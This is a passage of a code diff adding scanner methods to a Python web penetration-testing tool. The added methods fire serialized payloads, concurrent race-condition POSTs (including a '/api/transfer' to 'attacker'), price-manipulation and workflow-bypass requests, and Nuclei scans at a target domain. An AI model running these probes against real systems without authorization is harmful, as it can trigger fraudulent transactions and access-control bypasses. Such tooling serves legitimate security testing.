+                                headers = {'Content-Type': 'application/octet-stream'}
+                                response = requests.post(f"https://{self.domain}{endpoint}", 
+                                                       data=payload, headers=headers, timeout=10, verify=False)
+                                
+                                if response.status_code not in [404, 405]:
+                                    f.write(f"Interesting response to serialized payload: {response.status_code}\n")
+                                    
+                            except Exception as e:
+                                f.write(f"Error with payload: {e}\n")
+                    
+                    except Exception as e:
+                        f.write(f"Error testing endpoint {endpoint}: {e}\n")
+                    
+                    f.write("\n")
+                
+                f.write("Manual testing recommendations:\n")
+                f.write("- Identify serialization libraries in use\n")
+                f.write("- Test with ysoserial for Java deserialization\n")
+                f.write("- Check for pickle deserialization in Python apps\n")
+                f.write("- Test .NET BinaryFormatter vulnerabilities\n")
+                
+        except Exception as e:
+            self.print_error(f"Deserialization testing failed: {e}")
+        
+        self.print_success("Deserialization testing completed")
+
+    def race_condition_testing(self):
+        """Test for race condition vulnerabilities"""
+        self.print_info("Starting race condition testing...")
+        
+        race_output = f"{self.scan_dir}/vulnerabilities/race_condition_{self.domain}.txt"
+        
+        try:
+            import requests
+            import threading
+            import time
+            
+            def make_request(url, data, results, index):
+                try:
+                    response = requests.post(url, data=data, timeout=10, verify=False)
+                    results[index] = {
+                        'status': response.status_code,
+                        'length': len(response.text),
+                        'time': time.time()
+                    }
+                except Exception as e:
+                    results[index] = {'error': str(e), 'time': time.time()}
+            
+            with open(race_output, 'w') as f:
+                f.write("Race Condition Testing\n")
+                f.write("=" * 40 + "\n\n")
+                
+                # Test common race condition scenarios
+                race_scenarios = [
+                    {
+                        'endpoint': '/api/transfer',
+                        'data': {'amount': '100', 'to': 'attacker'},
+                        'description': 'Financial transaction race condition'
+                    },
+                    {
+                        'endpoint': '/coupon/redeem',
+                        'data': {'code': 'DISCOUNT50'},
+                        'description': 'Coupon redemption race condition'
+                    },
+                    {
+                        'endpoint': '/register',
+                        'data': {'username': 'testuser', 'email': 'test@test.com'},
+                        'description': 'Registration race condition'
+                    }
+                ]
+                
+                for scenario in race_scenarios:
+                    f.write(f"Testing: {scenario['description']}\n")
+                    f.write(f"Endpoint: {scenario['endpoint']}\n")
+                    
+                    url = f"https://{self.domain}{scenario['endpoint']}"
+                    
+                    # Launch multiple concurrent requests
+                    threads = []
+                    results = {}
+                    num_requests = 10
+                    
+                    start_time = time.time()
+                    
+                    for i in range(num_requests):
+                        thread = threading.Thread(target=make_request, 
+                                                args=(url, scenario['data'], results, i))
+                        threads.append(thread)
+                        thread.start()
+                    
+                    # Wait for all threads to complete
+                    for thread in threads:
+                        thread.join()
+                    
+                    # Analyze results
+                    successful_responses = 0
+                    status_codes = {}
+                    
+                    for i, result in results.items():
+                        if 'status' in result:
+                            status = result['status']
+                            status_codes[status] = status_codes.get(status, 0) + 1
+                            if status == 200:
+                                successful_responses += 1
+                    
+                    f.write(f"Concurrent requests sent: {num_requests}\n")
+                    f.write(f"Successful responses (200): {successful_responses}\n")
+                    f.write(f"Status code distribution: {status_codes}\n")
+                    
+                    if successful_responses > 1:
+                        f.write("POTENTIAL RACE CONDITION: Multiple successful responses\n")
+                    
+                    f.write("\n" + "-"*50 + "\n")
+                
+                f.write("\nManual testing recommendations:\n")
+                f.write("- Test payment and financial operations\n")
+                f.write("- Check file upload race conditions\n")
+                f.write("- Test privilege escalation scenarios\n")
+                f.write("- Verify atomic operations in critical functions\n")
+                
+        except Exception as e:
+            self.print_error(f"Race condition testing failed: {e}")
+        
+        self.print_success("Race condition testing completed")
+
+    def business_logic_testing(self):
+        """Test for business logic vulnerabilities"""
+        self.print_info("Starting business logic vulnerability testing...")
+        
+        logic_output = f"{self.scan_dir}/vulnerabilities/business_logic_{self.domain}.txt"
+        
+        try:
+            import requests
+            
+            with open(logic_output, 'w') as f:
+                f.write("Business Logic Vulnerability Testing\n")
+                f.write("=" * 40 + "\n\n")
+                
+                # Business logic test scenarios
+                test_scenarios = [
+                    {
+                        'name': 'Negative Price Testing',
+                        'endpoint': '/purchase',
+                        'data': {'item': 'product1', 'quantity': '1', 'price': '-100'},
+                        'description': 'Test negative prices in purchase flow'
+                    },
+                    {
+                        'name': 'Excessive Quantity Testing',
+                        'endpoint': '/cart/add',
+                        'data': {'item': 'product1', 'quantity': '999999999'},
+                        'description': 'Test integer overflow in quantity'
+                    },
+                    {
+                        'name': 'Price Manipulation',
+                        'endpoint': '/checkout',
+                        'data': {'total': '0.01', 'items': 'expensive_item'},
+                        'description': 'Test price manipulation during checkout'
+                    },
+                    {
+                        'name': 'Workflow Bypass',
+                        'endpoint': '/admin/approve',
+                        'data': {'request_id': '12345'},
+                        'description': 'Test workflow step bypassing'
+                    }
+                ]
+                
+                for scenario in test_scenarios:
+                    f.write(f"Test: {scenario['name']}\n")
+                    f.write(f"Description: {scenario['description']}\n")
+                    f.write(f"Endpoint: {scenario['endpoint']}\n")
+                    
+                    try:
+                        url = f"https://{self.domain}{scenario['endpoint']}"
+                        
+                        # Test GET request first
+                        get_response = requests.get(url, timeout=10, verify=False)
+                        f.write(f"GET Status: {get_response.status_code}\n")
+                        
+                        # Test POST with scenario data
+                        post_response = requests.post(url, data=scenario['data'], timeout=10, verify=False)
+                        f.write(f"POST Status: {post_response.status_code}\n")
+                        
+                        # Check for interesting responses
+                        if post_response.status_code == 200 and 'error' not in post_response.text.lower():
+                            f.write("POTENTIAL BUSINESS LOGIC ISSUE: Request accepted without validation\n")
+                        
+                        if 'success' in post_response.text.lower():
+                            f.write("POTENTIAL BUSINESS LOGIC BYPASS: Success message detected\n")
+                    
+                    except Exception as e:
+                        f.write(f"Error testing scenario: {e}\n")
+                    
+                    f.write("\n" + "-"*40 + "\n")
+                
+                # Additional business logic tests
+                f.write("Additional Business Logic Test Areas:\n")
+                f.write("=" * 40 + "\n")
+                
+                additional_tests = [
+                    "Password reset token reuse",
+                    "Multi-step process bypassing",
+                    "Privilege escalation through parameter manipulation",
+                    "Time-based restrictions bypass",
+                    "Geographic restrictions bypass",
+                    "Referral/invitation system abuse",
+                    "Discount code stacking",
+                    "Account lockout bypass"
+                ]
+                
+                for test in additional_tests:
+                    f.write(f"- {test}\n")
+                
+                f.write("\nManual testing recommendations:\n")
+                f.write("- Map all business workflows\n")
+                f.write("- Test boundary conditions\n")
+                f.write("- Verify access controls at each step\n")
+                f.write("- Check for missing authorization checks\n")
+                
+        except Exception as e:
+            self.print_error(f"Business logic testing failed: {e}")
+        
+        self.print_success("Business logic testing completed")
+
+    def nuclei_template_execution(self):
+        """Execute Nuclei vulnerability templates"""
+        self.print_info("Starting Nuclei template execution...")
+        
+        nuclei_output = f"{self.scan_dir}/vulnerabilities/nuclei_{self.domain}.txt"
+        
+        if self.check_tool_installed('nuclei'):
+            # Update nuclei templates
+            self.run_command("nuclei -update-templates")
+            
+            # Run nuclei with various severity levels
+            nuclei_commands = [
+                f"nuclei -u https://{self.domain} -s critical,high -o {nuclei_output}",
+                f"nuclei -u https://{self.domain} -tags cve -o {nuclei_output.replace('.txt', '_cve.txt')}",
+                f"nuclei -u https://{self.domain} -tags exposure -o {nuclei_output.replace('.txt', '_exposure.txt')}",
+                f"nuclei -u https://{self.domain} -tags misconfig -o {nuclei_output.replace('.txt', '_misconfig.txt')}"
+            ]
+            
+            for cmd in nuclei_commands:
+                self.run_command(cmd)
+        else:
+            # Install nuclei if not present
+            self.print_warning("Nuclei not installed, attempting to install...")
+            if self.run_command("go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest"):
+                self.nuclei_template_execution()  # Retry after installation
+        
+        self.print_success("Nuclei template execution completed")
     
     def run(self):
         """Main execution method"""
